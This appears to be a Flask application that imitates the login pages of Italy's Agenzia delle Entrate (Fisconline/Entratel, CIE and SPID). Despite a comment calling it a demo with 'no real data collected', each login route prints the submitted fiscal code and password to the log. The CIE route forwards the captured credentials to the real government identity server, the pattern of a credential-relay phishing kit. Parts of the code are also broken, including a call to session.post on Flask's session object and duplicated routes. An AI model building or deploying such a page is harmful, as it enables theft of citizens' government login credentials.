from flask import Flask, render_template, request, redirect, url_for, session
from config import Config

app = Flask(__name__)
app.config.from_object(Config)

SECRET_KEY = app.config['SECRET_KEY']
app.secret_key = SECRET_KEY

# Demo credentials (Fisconline/Entratel style — no real data collected)
FAKE_CODICE_FISCALE = app.config['FAKE_CODICE_FISCALE']
FAKE_PASSWORD       = app.config['FAKE_PASSWORD']

@app.route('/', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('IDToken1', '').strip()
        password = request.form.get('IDToken2', '').strip()
        print(f"Attempted login with Codice Fiscale: {username}, Password: {password}")
        if username == FAKE_CODICE_FISCALE and password == FAKE_PASSWORD:
            session['user'] = username
            return redirect(url_for('dashboard'))
        else:
            error = 'ASDFGHJKL'

    return render_template('login.html', error=error)

@app.route('/cie')
def cie():
    return render_template('cie.html')

@app.route('/cie', methods=['GET', 'POST'])
def cie_login():
    error = None
    if request.method == 'POST':
        base_url = "https://sp.agenziaentrate.gov.it/rp/cie/sel"
        login_url = "https://idserver.servizicie.interno.gov.it/idp/login/livello2"
        username = request.form.get('IDToken1', '').strip()
        password = request.form.get('IDToken2', '').strip()
        print(f"Attempted login with Codice Fiscale: {username}, Password: {password}")
        credentials = {
            "username": username,
            "password": password
        }
        response = session.post(login_url, data=credentials)
        print(response.status_code)
        #if username == FAKE_CODICE_FISCALE and password == FAKE_PASSWORD:
        #    session['user'] = username
        #    return redirect(url_for('dashboard'))
        #else:
        #    error = 'Le credenziali inserite non sono corrette. Verificare codice fiscale e password.'

    return render_template('login.html', error=error)

@app.route('/spid')
def spid():
    return render_template('spid.html')

@app.route('/spid', methods=['GET', 'POST'])
def spid_login():
    error = None
    if request.method == 'POST':
        username = request.form.get('IDToken1', '').strip()
        password = request.form.get('IDToken2', '').strip()
        print(f"Attempted login with Codice Fiscale: {username}, Password: {password}")
        if username == FAKE_CODICE_FISCALE and password == FAKE_PASSWORD:
            session['user'] = username
            return redirect(url_for('dashboard'))
        else:
            error = 'Le credenziali inserite non sono corrette. Verificare codice fiscale e password.'

    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=True)
